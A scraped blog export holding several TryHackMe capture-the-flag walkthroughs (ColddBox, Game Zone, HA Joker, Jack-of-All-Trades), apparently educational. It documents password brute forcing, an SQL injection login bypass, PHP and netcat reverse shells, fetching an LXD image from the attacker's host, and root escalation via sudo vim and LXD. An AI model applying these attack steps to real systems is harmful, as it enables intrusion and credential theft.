\u0026lt;==================================\u0026gt; (100 / 100) 100.00% Time: 00:00:02 [i] No Medias Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;========================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] the cold in person | Found By: Rss Generator (Passive Detection) [+] c0ldd | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] hugo | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] philip | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Jan 10 04:08:52 2021 [+] Requests Done: 3136 [+] Cached Requests: 10 [+] Data Sent: 781.452 KB [+] Data Received: 16.528 MB [+] Memory used: 238.738 MB [+] Elapsed time: 00:01:00   Performed wpscan enumeration confirmed our previously found users and also found out of date theme called twentyfifteen.\nLet\u0026rsquo;s try to brute force their credentials.\n1 2 3 4 5 6 7  wpscan --url http://{TARGET MACHINE IP} -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt . . . [+] Performing password attack on Wp Login against 3 user/s [SUCCESS] - c0ldd / 9876543210 . . .   Gaining Access We were able to brute force c0ldd credentials and now we can try to login via admin panel (/wp-admin)\n\nSuccess, we are in!\n\nTheme Exploitation Navigate to Appearance -\u0026gt; Editor\nOn the right side we can see diferent php templates we are able to edit.\n\nChoose one that is easily accessible, because we are going to replace its content with php reverse shell and then browse to it.\nDon\u0026rsquo;t forget to change $ip and note the port number (if you don\u0026rsquo;t change it).\n\nPress Update File and start listener on your local machine. In my case I chose header.php so I need to browse to http://{TARGET MACHINE IP}/wp-content/themes/twentyfifteen/header.php\nTo execute the code and spawn a shell as the user (www-data).\n1 2 3 4 5 6 7 8 9  nc -lnvp 1234 listening on [any] 1234 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.145.98] 55580 Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 11:30:25 up 39 min, 0 users, load average: 0.00, 0.00, 0.02 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $   Upgrade and stabilize given shell with these commands:\n1 2 3 4  $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@ColddBox-Easy:/$ export TERM=xterm export TERM=xterm www-data@ColddBox-Easy:/$   Ctrl + Z to background the shell\nIn our terminal type stty raw -echo; fg\nThis turns off our own terminal echo and gives us\n access to tab autocompletes access the arrow keys access Ctrl + C to kill processes  Then foregrounds the shell, which means completing the process.\nGaining User Privileges Navigating to /www/html/ and reading though different php files, wp-config.php gives us some useful informations.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  . . . // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;colddbox\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;c0ldd\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;cybersecurity\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); . . .   It looks like we found one of the users password for MySQL database.\nLet\u0026rsquo;s see if the user reuses his password.\nSuccess!\n1 2  c0ldd@ColddBox-Easy:/var/www/html$ id uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)   User Flag 1 2 3 4 5 6 7 8 9 10 11 12 13  c0ldd@ColddBox-Easy:~$ ls -la total 24 drwxr-xr-x 3 c0ldd c0ldd 4096 oct 19 18:51 . drwxr-xr-x 3 root root 4096 sep 24 16:52 .. -rw------- 1 c0ldd c0ldd 0 oct 19 18:51 .bash_history -rw-r--r-- 1 c0ldd c0ldd 220 sep 24 16:52 .bash_logout -rw-r--r-- 1 c0ldd c0ldd 0 oct 14 13:28 .bashrc drwx------ 2 c0ldd c0ldd 4096 sep 24 16:53 .cache -rw-r--r-- 1 c0ldd c0ldd 655 sep 24 16:52 .profile -rw-r--r-- 1 c0ldd c0ldd 0 sep 24 16:53 .sudo_as_admin_successful -rw-rw---- 1 c0ldd c0ldd 53 sep 24 18:22 user.txt c0ldd@ColddBox-Easy:~$ cat user.txt | wc -c 53   Privilege Escalation With c0ldd\u0026rsquo;s password we can check if he has any sudo privileges.\n1 2 3 4 5 6 7 8 9 10  c0ldd@ColddBox-Easy:/var/www/html$ sudo -l [sudo] password for c0ldd: Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy: (root) /usr/bin/vim (root) /bin/chmod (root) /usr/bin/ftp   We will escalate privileges with text editor vim : https://gtfobins.github.io/gtfobins/vim/\n1 2 3 4  c0ldd@ColddBox-Easy:~$ sudo vim -c \u0026#39;:!/bin/sh\u0026#39; # id  uid=0(root) gid=0(root) grupos=0(root)   Root Flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14  # cd /root # ls -la total 32 drwx------ 4 root root 4096 sep 24 18:52 . drwxr-xr-x 23 root root 4096 sep 24 16:47 .. -rw------- 1 root root 10 oct 19 18:53 .bash_history -rw-r--r-- 1 root root 0 oct 14 13:28 .bashrc drwx------ 2 root root 4096 sep 24 18:52 .cache -rw------- 1 root root 220 sep 24 17:02 .mysql_history drwxr-xr-x 2 root root 4096 sep 24 16:54 .nano -rw-r--r-- 1 root root 148 ago 17 2015 .profile -rw-r--r-- 1 root root 49 sep 24 18:23 root.txt # cat root.txt | wc -c 49   ","description":"An easy level machine with multiple ways to escalate privileges.","id":20,"section":"posts","tags":["exploitation","privilege escalation","brute force","wordpress"],"title":"ColddBox [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/colddbox/"},{"content":"   Title Game Zone     Info Learn to hack into this machine. Understand how to use SQLMap, crack passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!   Difficulty Easy    Reconnaissance Deploy the machine and access its web server.\n What is the name of the large cartoon avatar holding a sniper on the forum?\n \nBased on the Wikipedia it is agent 47.\nGaining Access SQLi SQL is a standard language for storing, editing and retrieving data in databases.\nA query example:\nSELECT * FROM users WHERE username = :username AND password := password\nHere is a potential place of vulnerability, as you can input your username as another SQL query.\nIf we have our username as admin and our password as: ' or 1=1 \u0026ndash; - it will insert this into the query and authenticate our session.\nThe SQL query executed on the web server will be:\nSELECT * FROM users WHERE username = admin AND password := ' or 1=1 \u0026ndash; -\nThe extra SQL has changed the above query to break the initial query and proceed if 1==1, then comment the rest of the query to stop it breaking.\n When you\u0026rsquo;ve logged in, what page do you get redirected to?\n Using ' or 1=1 \u0026ndash; - as a username and leaving password blank successfully authenticate us and automatically redirects to portal.php\n\nSQLMap SQLMap is a popular open-source, automatic SQL injection and database takeover tool\nWe\u0026rsquo;re going to use SQLMap to dump the entire database for GameZone.\nUsing the page we logged into earlier, we\u0026rsquo;re going point SQLMap to the game review search feature.\nFirst we need to intercept a request made to the search feature using BurpSuite.\n\nSave this request into a text file and then pass this into SQLMap to use our authenticated user session.\nsqlmap -r request \u0026ndash;dbms=mysql \u0026ndash;dump\n-r uses the intercepted request you saved earlier\n\u0026ndash;dbms\ttells SQLMap what type of database management system it is\n\u0026ndash;dump attempts to outputs the entire database\n In the users table, what is the hashed password?\nWhat was the username associated with the hashed password?\nWhat was the other table name?\n \nCracking SSH Password John the Ripper is a fast, free and open-source password cracker.\n What is the de-hashed password?\n 1 2 3 4 5 6 7 8 9 10 11  john --format=raw-sha256 hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status videogamer124 (?) 1g 0:00:00:00 DONE (2021-01-07 06:49) 1.470g/s 4264Kp/s 4264Kc/s 4264KC/s vimivi..vhunlex121 Use the \u0026#34;--show --format=Raw-SHA256\u0026#34; options to display all of the cracked passwords reliably Session completed   hash\tfile with our hash value found earlier\n\u0026ndash;wordlist the wordlist you\u0026rsquo;re using to find the dehashed value\n\u0026ndash;format\tthe hashing algorithm used (our case its hashed using SHA256)\n Now you have a password and username.\nTry SSH\u0026rsquo;ing onto the machine.\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ssh agent47@10.10.21.174 The authenticity of host \u0026#39;10.10.21.174 (10.10.21.174)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.21.174\u0026#39; (ECDSA) to the list of known hosts. agent47@10.10.21.174\u0026#39;s password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147 agent47@gamezone:~$   User Flag 1 2 3 4 5 6 7 8 9 10 11 12  agent47@gamezone:~$ ls -la total 28 drwxr-xr-x 3 agent47 agent47 4096 Aug 16 2019 . drwxr-xr-x 3 root root 4096 Aug 14 2019 .. lrwxrwxrwx 1 root root 9 Aug 16 2019 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 agent47 agent47 220 Aug 14 2019 .bash_logout -rw-r--r-- 1 agent47 agent47 3771 Aug 14 2019 .bashrc drwx------ 2 agent47 agent47 4096 Aug 16 2019 .cache -rw-r--r-- 1 agent47 agent47 655 Aug 14 2019 .profile -rw-rw-r-- 1 agent47 agent47 33 Aug 16 2019 user.txt agent47@gamezone:~$ cat user.txt 649ac17b1480ac13ef1e4fa579dac95c   Reverse SSH Tunnels \nReverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.\n-L is a local tunnel : YOU \u0026lt;\u0026ndash; CLIENT\nIf a site was blocked, you can forward the traffic to a server you own and view it.\n-R is a remote tunnel : YOU \u0026ndash;\u0026gt; CLIENT\nYou forward your traffic to the other server for others to view.\nWe will use a tool called ss to investigate sockets running on a host.\nRuning ss -tulpn will tell us what socket connections are running\n   Argument Description     -t Display TCP sockets   -u Display UDP sockets   -l Displays only listening sockets   -p Shows the process using the socket   -n Doesn\u0026rsquo;t resolve service names    1 2 3 4 5 6 7 8 9  agent47@gamezone:~$ ss -tulpn Netid State Recv-Q Send-Q Local Address:Port\tPeer Address:Port udp UNCONN 0 0 *:10000 *:* udp UNCONN 0 0 *:68 *:* tcp LISTEN 0 80 127.0.0.1:3306 *:* tcp LISTEN 0 128 *:10000 *:* tcp LISTEN 0 128 *:22 *:* tcp LISTEN 0 128 :::80 :::* tcp LISTEN 0 128 :::22 :::*    How many TCP sockets are running?\n 5\n What is the name of the exposed CMS?\n Service running on port 10000 is blocked via a firewall rule from the outside.\nWe can see this from the IPtable list.\nUsing an SSH Tunnel we can expose the port to us locally.\nLocal machine:\nssh -L 10000:localhost:10000 @\nOnce complete, in your browser type localhost:10000 and you can access the newly-exposed webserver.\n What is the CMS version?\n \n What is the CMS version?\n Successfully loged in with reused credentials agent47:videogamer124\n\nPrivilege Escalation Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.\nStart Metaspolit with msfconsole.\nUsing Exploit Databse and searching for webmin 1.5 gives us RCE for our CMS version: https://www.exploit-db.com/exploits/21851\n\nSet required values and then set payload to cmd/unix/reverse.\n\nWe successfully exploited the target and the session was created in the background.\n\nRoot Flag \n","description":"Learn to hack into this machine. Understand how to use SQLMap, crack passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!","id":21,"section":"posts","tags":["enumeration","sqli","hash cracking","exploitation","reverse SSH","metasploit","webmin","privilege escalation"],"title":"Game Zone [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/game-zone/"},{"content":"   Title HA Joker CTF     Info Batman hits Joker.   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12  nmap -p- -sV {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 01:40 CST Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 59.11% done; ETC: 01:48 (0:03:13 remaining) Nmap scan report for 10.10.15.48 Host is up (0.069s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8080/tcp open http Apache httpd 2.4.29 Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  gobuster dir -u http://{TARGET MACHINE IP} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.15.48 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/01/06 01:45:03 Starting gobuster =============================================================== /.hta (Status: 403) /.hta.txt (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /.htaccess (Status: 403) /.htaccess.php (Status: 403) /.htaccess.html (Status: 403) /.htaccess.txt (Status: 403) /.htpasswd (Status: 403) /.htpasswd.txt (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.html (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /phpinfo.php (Status: 200) /phpinfo.php (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) =============================================================== 2021/01/06 01:47:25 Finished ===============================================================   What version of Apache is it?\n2.4.29\nWhat port on this machine not need to be authenticated by user and password?\nport 80\nThere is a file on this port that seems to be secret, what is it?\n\nThere is another file which reveals information of the backend, what is it?\nphpinfo.php\nWhen reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?\njoker\nWhat port on this machine need to be authenticated by Basic Authentication Mechanism?\n\nGaining Access At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password.\nWhat is that password?\n1 2 3 4 5 6 7 8 9 10  hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 {TARGET MACHINE IP} http-get / Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 01:56:41 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking http-get://10.10.15.48:8080/ [8080][http-get] host: 10.10.15.48 login: joker password: hannah 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 01:57:20   We got the user and password and we see a cms based blog.\nNow check for directories and files in this port.\nWhat directory looks like as admin directory?\n\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  gobuster dir -U joker -P hannah -u http://{TARGET MACHINE IP}:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.15.48:8080 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Auth User: joker [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2021/01/06 02:01:06 Starting gobuster =============================================================== /.hta (Status: 403) /.hta.php (Status: 403) /.hta.html (Status: 403) /.hta.txt (Status: 403) /.htaccess (Status: 403) /.htaccess.html (Status: 403) /.htpasswd (Status: 403) /.htaccess.txt (Status: 403) /.htpasswd.php (Status: 403) /.htpasswd.html (Status: 403) /.htpasswd.txt (Status: 403) /.htaccess.php (Status: 403) /administrator (Status: 301) /bin (Status: 301) /cache (Status: 301) [ERROR] 2021/01/06 02:01:33 [!] net/http: request canceled (Client.Timeout exceeded while reading body) /components (Status: 301) /configuration.php (Status: 200) /images (Status: 301) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /language (Status: 301) /layouts (Status: 301) /libraries (Status: 301) /LICENSE (Status: 200) /LICENSE.txt (Status: 200) /media (Status: 301) /modules (Status: 301) /plugins (Status: 301) /README (Status: 200) /README.txt (Status: 200) /robots (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) /templates (Status: 301) /tmp (Status: 301) /web.config (Status: 200) /web.config.txt (Status: 200) =============================================================== 2021/01/06 02:03:30 Finished ===============================================================   \nWe need access to the administration of the site in order to get a shell, there is a backup file.\nWhat is this file?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  nikto -h http://{TARGET MACHINE IP}:8080 -id joker:hannah - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.15.48 + Target Hostname: 10.10.15.48 + Target Port: 8080 + Start Time: 2021-01-06 02:05:41 (GMT-6) --------------------------------------------------------------------------- + Server: Apache/2.4.29 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + / - Requires Authentication for realm \u0026#39; Please enter the password.\u0026#39; + Successfully authenticated to realm \u0026#39; Please enter the password.\u0026#39; with user-supplied credentials. + Entry \u0026#39;/administrator/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/bin/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/cache/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/cli/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/components/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/includes/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/language/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/layouts/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/libraries/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/modules/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/plugins/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry \u0026#39;/tmp/\u0026#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + \u0026#34;robots.txt\u0026#34; contains 14 entries which should be manually viewed. + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + /backup.zip: Potentially interesting archive/cert file found. . . . {TARGET MACHINE IP}:8080/backup.zip   We have the backup file and now we should look for some information, for example database, configuration files, etc \u0026hellip;\nBut the backup file seems to be encrypted.\nWhat is the password?\n1 2 3 4 5 6 7 8 9 10 11  zip2john backup.zip \u0026gt; zipHash john zipHash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hannah (backup.zip) 1g 0:00:00:00 DONE (2021-01-06 02:10) 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Remember that\u0026hellip; We need access to the administration of the site\u0026hellip;\nIn our new discovery we see some files that have compromising information, maybe db?\nOk what if we do a restoration of the database!\nSome tables must have something like user_table!\nWhat is the super duper user?\n1  unzip backup.zip   Enter password obtained from the previos question.\nTwo directiories were extracted: db, site\ndb directory contains joomladb.sql\nRead the found sql file in a text aditor and look for \u0026ldquo;super duper user\u0026rdquo;.\n\nSuper Duper User!\nWhat is the password?\nCopy found hash value into a new text file.\n1 2 3 4 5 6 7 8 9 10  john adminHash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status abcd1234 (?) 1g 0:00:00:19 DONE (2021-01-06 02:54) 0.05205g/s 53.40p/s 53.40c/s 53.40C/s bullshit..bulldogs Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   At this point, you should be upload a reverse-shell in order to gain shell access.\nWhat is the owner of this session?\nGoing back to http://{TARGET MACHINE IP}:8080/administrator/ and loging in with credentials: admin:abcd1234\nHere I found an article with two ways how to exploit Joomla tempates: https://www.hackingarticles.in/joomla-reverse-shell/\nAfter succesfull exploitation we are in.\n1 2  whoami www-data   This user belongs to a group that differs on your own group, What is this group?\n1 2  id uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)   Spawn a tty shell.\n1 2  $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@ubuntu:/$   Privilege Escalation LXD Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.\nThe idea here is to mount the root of the OS file system on the container, this should give us access to the root directory.\nCreate the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.\nWhat is the name of the file in the /root directory?\nLocal machine:\n1 2 3  git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine   Start a simple http python server and download tar archive on the target machine.\n1  python3 -m http.server 80   Target machine:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  cd /tmp wget http://10.9.140.180:80/alpine-v3.12-x86_64-20210106_0325.tar.gz lxc image import ./alpine-v3.12-x86_64-20210106_0325.tar.gz --alias myimage lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh ~ # id  id uid=0(root) gid=0(root) ~ # cd /mnt/root/root cd /mnt/root/root ~ # ls final.txt   ","description":"Batman hits Joker.","id":22,"section":"posts","tags":["enumeration","hash cracking","lxd"],"title":"HA Joker CTF [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/ha-joker-ctf/"},{"content":"   Title Jack-of-All-Trades     Info Boot-to-root originally designed for Securi-Tay 2020   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 12:33 CST Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.28% done; ETC: 12:33 (0:00:00 remaining) Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.64% done; ETC: 12:33 (0:00:00 remaining) Nmap scan report for 10.10.122.111 Host is up (0.071s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp\topen http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Jack-of-all-trades! |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA) | 2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA) | 256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA) |_ 256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://{TARGET MACHINE IP}:22 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.122.111:22 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/05 12:36:20 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /index.html (Status: 200) /server-status (Status: 403) =============================================================== 2021/01/05 12:36:56 Finished ===============================================================   \n\nPort 22 is used for SSH so trying to navigate to this port in the browser will be restricted. We will have to override settings for banned ports.\nNavigate to about:config and type network.security.ports.banned.override\nChange the type to String and value to 22.\nThen click on the plus button to add our new preference.\nIf you are using Firefox more on that here: https://support.mozilla.org/en-US/kb/about-config-editor-firefox\n\nNow we can visit {TARGET MACHINE IP}:22\n\nDecoding \u0026amp; Steganography Source code comment:\n1 2  \u0026lt;!--Note to self - If I ever get locked out I can get back in at /recovery.php! --\u0026gt; \u0026lt;!-- UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --\u0026gt;   Based on the last two characters we know that the note was encoded to base64.\n\n\nOnce again we found another comment in the web page source code encoded to base64.\nSource code comment:\n1 2 3  \u0026lt;!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= --\u0026gt;   \nDecoded message includes shortened link bit.ly/2TvYQ2S which translates to https://en.wikipedia.org/wiki/Stegosauria\nThis is a hint for Steganography so navigate back to the main page and download the header image. Use flag info to check if something was hidden in the jpg image. Then extract -sf to extract hidden message.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  steghide info header.jpg \u0026#34;header.jpg\u0026#34;: format: jpeg capacity: 3.5 KB Try to get information about embedded data ? (y/n) y Enter passphrase: steghide: could not extract any data with that passphrase! steghide extract -sf header.jpg Enter passphrase: wrote extracted data to \u0026#34;cms.creds\u0026#34;. ls total 84K drwxr-xr-x 12 root root 4.0K Jan 5 12:54 .. -rw-r--r-- 1 root root 69K Jan 5 12:54 header.jpg -rw-r--r-- 1 root root 93 Jan 5 12:56 cms.creds drwxr-xr-x 2 root root 4.0K Jan 5 12:56 . cat cms.creds 1 Here you go Jack. Good thing you thought ahead! 2 3 Username: jackinthebox 4 Password: TplFxiSHjY   Success! We found credentials for recovery.php where we can login.\nGaining Access \nBased on the hint we can provide any command after ?cmd= which will be executed on the server side and the output will be printed for us right on the page.\nLet\u0026rsquo;s try it with command id\n\nFormat for Web Netcat Reverse shell: http://{TARGET MACHINE IP}:22/nnxhweOV/index.php?cmd=nc -e 